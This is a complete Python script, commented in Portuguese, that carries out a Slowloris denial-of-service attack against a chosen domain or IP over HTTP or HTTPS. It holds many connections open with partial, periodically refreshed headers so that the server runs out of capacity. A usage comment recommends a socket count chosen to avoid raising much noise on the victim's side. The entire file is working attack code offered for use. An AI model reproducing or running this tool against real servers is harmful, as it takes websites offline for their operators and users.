#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import ssl
import sys
import time

# uso padrão > python slowloris_dominio.py urlteste.com -s 200 // digitar url sem o protocolo / 200 sockets = quantidade ideal de sockets para não gerar muitos ruídos no lado de quem recebe o ataque
parser = argparse.ArgumentParser(description="Slowloris para domínios ou IPs")
parser.add_argument("host", help="Host ou IP de destino")
parser.add_argument("-p", "--port", default=80, type=int, help="Porta (padrão: 80)")
parser.add_argument("-s", "--sockets", default=150, type=int, help="Nº de sockets (padrão: 150)")
parser.add_argument("-v", "--verbose", action="store_true", help="Ativa logging detalhado")
parser.add_argument("-ua", "--randuseragents", action="store_true", help="User-Agents aleatórios")
parser.add_argument("--https", action="store_true", help="Usar HTTPS")
parser.add_argument("--sleeptime", default=15, type=int, help="Delay entre headers (padrão: 15s)")
args = parser.parse_args()

# logs
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.DEBUG if args.verbose else logging.INFO
)

# resolução de domínio para IP
original_host = args.host
try:
    resolved_ip = socket.gethostbyname(args.host)
except socket.gaierror:
    logging.error(f"Erro ao resolver o host: {args.host}")
    sys.exit(1)


def send_line(self, line):
    self.send(f"{line}\r\n".encode("utf-8"))


def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

if args.https:
    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

list_of_sockets = []


def init_socket(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if args.https:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=original_host)

        s.connect((ip, args.port))
        s.send_line(f"GET /?{random.randint(0, 9999)} HTTP/1.1")

        ua = random.choice(user_agents) if args.randuseragents else user_agents[0]
        s.send_header("Host", original_host)
        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")

        return s
    except Exception as e:
        logging.debug(f"Erro ao criar socket: {e}")
        return None


def slowloris_iteration():
    logging.info(f"Enviando keep-alive... ({len(list_of_sockets)} sockets ativos)")
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info(f"Abrindo {diff} novos sockets...")
    for _ in range(diff):
        s = init_socket(resolved_ip)
        if s:
            list_of_sockets.append(s)


def main():
    logging.info(f"Atacando {original_host} ({resolved_ip}) na porta {args.port} com {args.sockets} sockets")
    for _ in range(args.sockets):
        s = init_socket(resolved_ip)
        if s:
            list_of_sockets.append(s)

    while True:
        try:
            slowloris_iteration()
        except KeyboardInterrupt:
            logging.info("Interrompido pelo usuário. Encerrando.")
            break
        except Exception as e:
            logging.debug(f"Erro: {e}")
        time.sleep(args.sleeptime)


if __name__ == "__main__":
    main()
